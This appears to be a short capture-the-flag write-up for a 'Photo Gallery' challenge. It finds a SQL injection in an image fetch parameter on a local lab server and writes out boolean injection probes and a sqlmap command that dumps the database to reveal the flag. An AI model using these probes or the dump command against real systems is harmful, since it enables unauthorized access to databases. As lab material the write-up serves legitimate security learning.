# Photo Gallery - FLAG1

## 0x00 Index

![](./imgs/index.jpg)

## 0x01 Check Image Source

![](./imgs/imgs.jpg)

The image link looks like injectable 

http://127.0.0.1/xxxxxxxxxx/fetch?id=1

![](./imgs/img_src.jpg)

Tried with the following

```sql
fetch?id=1 and 1=1
fetch?id=1 and 1=2
```

1=1 works but 1=2 does not and shows some error.

![](./imgs/err.jpg)

## 0x02 Blind Injection

Do it with SqlMap.

```
python sqlmap.py -u http://127.0.0.1/xxxxxxxxxx/fetch?id=1 --dump
```

![](./imgs/flag.jpg)